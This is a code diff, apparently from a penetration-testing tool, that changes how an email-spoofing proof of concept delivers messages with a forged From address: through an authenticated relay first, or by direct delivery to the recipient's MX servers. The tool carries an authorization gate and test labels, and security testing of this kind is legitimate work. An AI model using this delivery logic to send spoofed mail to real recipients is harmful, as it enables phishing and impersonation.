@@ -292,7 +292,9 @@ def parse_args(argv=None):
     p.add_argument("--subject", default="[AUTHORIZED SECURITY TEST] Email spoofing PoC")
     p.add_argument("--body", default="This is an authorized email spoofing proof-of-concept. No action required.")
     p.add_argument("--body-file", help="Lê o corpo de um arquivo")
-    p.add_argument("--smtp", help="Relay de fallback HOST[:PORT]")
+    p.add_argument("--smtp", help="Relay HOST[:PORT] — caminho primário de envio quando fornecido")
+    p.add_argument("--allow-direct", action="store_true",
+                   help="Permite fallback de entrega direta na porta 25 quando o relay não enfileira.")
     p.add_argument("--smtp-user")
     p.add_argument("--smtp-pass",
                    help="Senha do relay. Prefira a env STIGLITZ_SMTP_PASS (evita exposição em ps/history).")
@@ -351,24 +353,30 @@ def main(argv=None):
             print(f"\n  [✓] Evidência analítica em {outdir}/spoof_evidence.json")
             return 0
 
-        method_desc = "direct-MX" + (" (fallback relay)" if args.smtp else "")
+        method_desc = ("relay " + args.smtp) if args.smtp else "direct-MX"
         if not roe_gate(forged_from, args.to, method_desc, assume_yes=args.roe_accept):
             return 1
 
-        recipient_domain = args.to.split("@", 1)[1]
-        mx_hosts = parse_mx(dig("MX", recipient_domain))
         msg_bytes = msg.as_bytes()
-
-        result = {"accepted": False, "transcript": ["sem MX resolvido"]}
-        if mx_hosts:
-            result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
-        if not result["accepted"] and args.smtp:
-            print("  [→] Entrega direta falhou — tentando relay configurado ...")
+        if args.smtp:
+            print("  [!] Relay autenticado: a prova de spoof só vale se o relay PRESERVAR o "
+                  "From: forjado. Relays gerenciados (Gmail/SES/etc) reescrevem/rejeitam.")
             host, _, port = args.smtp.partition(":")
             smtp_pass = args.smtp_pass or os.environ.get("STIGLITZ_SMTP_PASS")
             result = deliver_relay(host, int(port) if port else 587,
                                    args.smtp_user, smtp_pass, helo,
                                    forged_from, args.to, msg_bytes)
+            if result.get("smtp_stage") != "QUEUED" and args.allow_direct:
+                print("  [→] Relay não enfileirou — fallback de entrega direta (--allow-direct) ...")
+                mx_hosts = parse_mx(dig("MX", args.to.split("@", 1)[1]))
+                if mx_hosts:
+                    result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
+        else:
+            mx_hosts = parse_mx(dig("MX", args.to.split("@", 1)[1]))
+            result = {"method": "direct", "mx_used": None, "accepted": False,
+                      "smtp_stage": "TRANSPORT_FAILED", "transcript": ["sem MX resolvido"]}
+            if mx_hosts:
+                result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
 
         send = {
             "recipient": args.to,
